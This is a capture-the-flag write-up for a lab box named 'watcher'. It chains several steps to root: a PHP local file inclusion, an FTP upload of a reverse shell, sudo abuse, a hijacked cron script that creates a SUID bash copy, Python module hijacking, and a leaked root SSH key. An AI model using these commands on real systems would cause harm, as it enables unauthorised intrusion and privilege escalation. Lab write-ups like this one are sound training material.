# Enumeration

Starting with nmap
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-15 23:07 IST
Nmap scan report for 10.10.12.184
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Corkplacemats
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.50 seconds
```
Looking at the results, we have port 21,22 and 80 open. There's no anonymous access to FTP, so we'll start with webserver i.e. port 80

### Port 80

Looking at the page, we have website featuring some merchandise. Looking at good old *robots.txt*, we saw 

![image](https://user-images.githubusercontent.com/43528306/141828453-86f20ece-6598-44cd-b4fd-11b3dc14423e.png)

The first file gave us the flag1. But looking at second file, we got 403.

Going back to webpage, we can check the products. The URL for the product page was `/post.php?post=stripped.php`. This parameter was vulnerable to LFI

![image](https://user-images.githubusercontent.com/43528306/141828937-3e14b981-2f82-41b7-871e-b5d27e87293b.png)

The first thing that came to mind, LFI to RCE, but we were not able to get any log files or session files. Since we were not able to read the second file (in robots.txt), we can try to reading it through LFI

![image](https://user-images.githubusercontent.com/43528306/141829084-ad451fae-1a69-43fe-bb6e-a5fb2cbe1c4b.png)

```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777
```

The file provided us the credentials to access FTP, also the location where files from FTP are saved.

### Port 21:
Logging in with the credentials, we saw
```bash
Name (10.10.12.184:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
```

The `files` directory was writable for us, so we can try uploading a simple PHP reverse-shell.
```bash
ftp> put shell.php
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Nov 15 18:00 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 ..
-rw-r--r--    1 1001     1001           29 Nov 15 17:53 shell.php
-rw-r--r--    1 1001     1001           33 Nov 15 17:59 test.php
```
We can now access this file using the LFI Vulnerability and setup the listner and we have shell on the box.

## Shell as www-data
We got shell on the box as *www-data*.
```bash
www-data@watcher:/var/www/html$ id;whoami
id;whoami
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```
The applicaton was vulnerable because of application includes the file directly from post request without any sanitization.
```php
<div class="row">
 <div class="col-2"></div>
 <div class="col-8">
  <?php include $_GET["post"]; ?>
 </div>
</div>
```
Looking for sudo permissions, we have permission as toby for all commands

```bash
www-data@watcher:/home/mat$ sudo -l
sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL

www-data@watcher:/home/mat$ sudo -u toby bash
```

## Shell as toby
```bash
toby@watcher:~$ ls
flag_4.txt  jobs  note.txt
toby@watcher:~$ cat note.txt 
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```
According to note, *Mat*, another user, left a cron job running. Looking at the cronjobs, we saw the `cow.sh` file was running every minute. Looking at file, it was owned
by us `toby`. So we can easily modify the script to give us shell.
```bash
toby@watcher:~/jobs$ ls -la
total 12
drwxrwxr-x 2 toby toby 4096 Dec  3  2020 .
drwxr-xr-x 7 toby toby 4096 Nov 15 18:13 ..
-rwxr-xr-x 1 toby toby   46 Dec  3  2020 cow.sh

toby@watcher:~/jobs$ echo 'cp /bin/bash /tmp/mats; chmod +xs /tmp/mats' > cow.sh
toby@watcher:~/jobs$ /tmp/matsh -p
```

## Shell as Mat
We got shell as *Mat*, there's another `note.txt` in the home directory. Looking at the contents of it
```bash
mat@watcher:~$ cat note.txt 
Hi Mat,

Ive set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will

# Checking for sudo perms
mat@watcher:~$ sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```
We have sudo rights to run the script as *will* user. Looking at `/scripts` directory, we have two files. One, `cmd.py` which was owned by Mat, and the other one `will_script.py` owned by Will.
Looking at `will_script.py`

```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```
The python script was importing function *get_command* from cmd.py file. As we own the *cmd.py* file we can change the content for our benefits. 
```python
# Original Script

mat@watcher:~/scripts$ cat cmd.py 
def get_command(num):
    if(num == "1"):
        return "ls -lah"
    if(num == "2"):
        return "id"
    if(num == "3"):
        return "cat /etc/passwd"
```
*Modified:*
```python
mat@watcher:~/scripts$ cat cmd.py 
import os

def get_command(num):
    os.system('bash')

    if(num == "1"):
        return "id"
```
Now, if we run the *will_script.py* file, it will include our modified *cmd.py* file and will give us a shell.

## Shell as Will
```bash
will@watcher:~$ id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
```
Will was part of `adm` group. Searching for files owned by this group using `find / -group adm -ls 2>/dev/null`, we got backups file in `/opt` directory.
```bash
will@watcher:/opt$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Dec  3  2020 .
drwxr-xr-x 24 root root 4096 Dec 12  2020 ..
drwxrwx---  2 root adm  4096 Dec  3  2020 backups

will@watcher:/opt/backups$ ls -la
total 12
drwxrwx--- 2 root adm  4096 Dec  3  2020 .
drwxr-xr-x 3 root root 4096 Dec  3  2020 ..
-rw-rw---- 1 root adm  2270 Dec  3  2020 key.b64
```
We have a base64 encoded key file. Decoding which, we got private ssh keys. Save it to local machine, changing the permissions of the file `chmod 600 key` and we can ssh as root on the box
And we got ROOT!!



